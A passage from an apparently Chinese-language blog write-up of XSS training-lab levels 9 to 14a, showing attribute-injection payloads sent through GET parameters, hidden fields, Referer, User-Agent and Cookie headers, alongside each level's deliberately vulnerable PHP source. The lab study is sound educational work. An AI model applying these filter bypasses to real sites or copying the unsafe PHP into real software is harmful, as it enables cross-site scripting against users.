class="line">&lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))    <span class="comment">//判断变量值是否存在字串 ‘http://’</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;  <span class="comment">//存在则直接拼接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>类型: url类型</p>
<p>解题思路：</p>
<p>输入一些测试语句（<script>alert(&#39;123&#39;);</script>）</p>
<p>但回显结果类似于：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_35.png" class="" title="在这里插入图片描述">

<ul>
<li>插入的语句被实例化，且无法准确有效地判断过滤特征或触发的行为结果–&gt;可能就不是这个参数（keyword&#x3D;）</li>
</ul>
<h3 id="隐藏标签"><a href="#隐藏标签" class="headerlink" title="*隐藏标签"></a>*隐藏标签</h3><blockquote>
<p>1.一些网站的后端可以接受隐藏的input标签的参数<br>2.隐藏input标签的目的是：后端需要input的返回值，但有不想用户看见—&gt;这种情况经常出现<br>3.hidden下的input标签的赋值往往是通过js代码的逻辑进行赋值，也存在通过post，get请求获取值</p>
</blockquote>
<ul>
<li>与前面关卡不同的是：有大量隐藏的input标签（hidden）</li>
</ul>
<p>测试使用get请求对隐藏的input标签赋值：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(%27123%27);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&amp;t_link=123&amp;t_history=456&amp;t_sort=789</span><br></pre></td></tr></table></figure>

<p>回显结果：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_36.png" class="" title="在这里插入图片描述">
<p>总共有四个键值对，探测出第四个键值对可能存在xss</p>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_37.png" class="" title="在这里插入图片描述">
<p>键值对以&amp;分割，不用担心keyword将后面的语句当作值</p>
<p>回显结果：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_38.png" class="" title="在这里插入图片描述">

<ul>
<li>回显的结果与第四关类似</li>
</ul>
<p>输入语句：（插属性）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br><span class="line">onclick 需要自主点击，所以需要’显示‘</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_39.png" class="" title="在这里插入图片描述">

<p>页面渲染：（多了一个输入文本框）</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_40.png" class="" title="在这里插入图片描述">
<p>点击即可通关</p>
<h3 id="趣事-1"><a href="#趣事-1" class="headerlink" title="*趣事"></a>*趣事</h3><p>—–&gt;有趣的是将括号里面的双引号改为单引号就无法成功插入<br>即输入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&#x27;123&#x27;)&#x27; type=&#x27;text&#x27;  //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_41.png" class="" title="在这里插入图片描述">
<blockquote>
<p>分析： onclick&#x3D;’alert(‘123’)’<br>1.浏览器将 前两个单引号看作一组即’alert(‘   –&gt;转为双赢号，即”alert(“    （标签属性后面浏览器都会单引号转为双引号）<br>2.对于剩下的 ‘)’  ，不是任何属性的值，不将单引号转为双引号，被当作属性或标签呈现蓝色</p>
</blockquote>
<ul>
<li>经验总结：使用多个相同的引号要注意浏览的识别规则</li>
</ul>
<p>补充：自动点击测试</p>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text &#x27; autofocus&quot;    </span><br><span class="line">autofocus是独立属性</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_42.png" class="" title="在这里插入图片描述">
<p>没有自动点击（）原因是尾部存在双引号–&gt;语法错误</p>
<p>测试：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27;  autofocus //</span><br><span class="line">实为：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">&#x27;alert(123)&#x27;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; autofocus type=&#x27;text&#x27; </span><br><span class="line">实为：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">&#x27;alert(123)&#x27;</span> <span class="attr">autofocus</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>实现自动点击</p>
<p>因此，注入的语句最后在尾部加注释（具体情况具体分析）</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];  <span class="comment">// 接受t_sort的参数 </span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;   </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>类型：url类型</p>
<p>解题思路：</p>
<p>没有输入任何语句，检查页面：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_43.png" class="" title="在这里插入图片描述">


<ul>
<li>包含多个隐藏标签</li>
<li>其中一个input标签存在值，是上一关注入的payload</li>
</ul>
<p>删除level11关页面后，用目录页面访问level11关，回显结果为：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_44.png" class="" title="在这里插入图片描述">

<ul>
<li>分析得出，t_ref的值记录的是从个网址访问的</li>
<li>可以推断出，后端将数据包中referer栏的地址拼接到value</li>
</ul>
<h3 id="Referer"><a href="#Referer" class="headerlink" title="*Referer"></a>*Referer</h3><p>刷新页面，抓取数据包：修改数据包中的Referer，即可完成payload注入</p>
<p>修改为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_45.png" class="" title="在这里插入图片描述">
<p>页面渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_46.png" class="" title="在这里插入图片描述">
<p>点击即可通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level12.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]; <span class="comment">//获取Referer </span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);  <span class="comment">//这里进行替换，可以选择插入属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>类型： url类型</p>
<p>与11关类似，不再过多演示</p>
<h3 id="HTTP-USER-AGENT"><a href="#HTTP-USER-AGENT" class="headerlink" title="*HTTP_USER_AGENT"></a>*HTTP_USER_AGENT</h3><img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_47.png" class="" title="在这里插入图片描述">
<p>修改为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //  </span><br><span class="line">上述语句失败-拼接value前双引号被实例化转义</span><br><span class="line">继续修改：</span><br><span class="line">&quot; onclick=alert(&#x27;123&#x27;) type=&#x27;text&#x27; //  </span><br><span class="line">成功绕过   </span><br><span class="line">细节：防止识别错误，除去alert两侧的单引号</span><br></pre></td></tr></table></figure>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level13.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];  <span class="comment">//获取代理信息</span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>; </span><br><span class="line"><span class="comment">//转义后再拼接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>类型：隐藏标签</p>
<p>解题思路：</p>
<p>探测：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">keyword=1&amp;t_link=2&amp;t_history=3&amp;t_sort=4&amp;t_cook=5</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_48.png" class="" title="在这里插入图片描述">
<p>测试t_sort</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_49.png" class="" title="在这里插入图片描述">

<ul>
<li>双引号被实例化转义</li>
</ul>
<p>其余测试payload也失败</p>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="*Cookie"></a>*Cookie</h3><p>抓取数据包修改cookie栏：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; onclick=alert(&#x27;123&#x27;) type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>

<p>点击文本框成功通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level14.php&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level13&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];  <span class="comment">//获取cookie</span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level14a"><a href="#level14a" class="headerlink" title="level14a"></a>level14a</h2><p>类型：</p>
<p>解题思路;</p>
<h3 id="PHP解析执行机制"><a href="#PHP解析执行机制" class="headerlink" title="*PHP解析执行机制"></a>*PHP解析执行机制</h3><blockquote>
<p>PHP 解析机制：PHP 文件本质上是服务器端脚本文件，当服务器接收到对 PHP 文件的请求时，会先对其中的 PHP 代码进行解析和执行。 如果文件里有 HTML、CSS、JavaScript 代码，PHP 解析器会直接将这些非 PHP 代码原样输出给客户端。</p>
</blockquote>
<p>输入：</p>
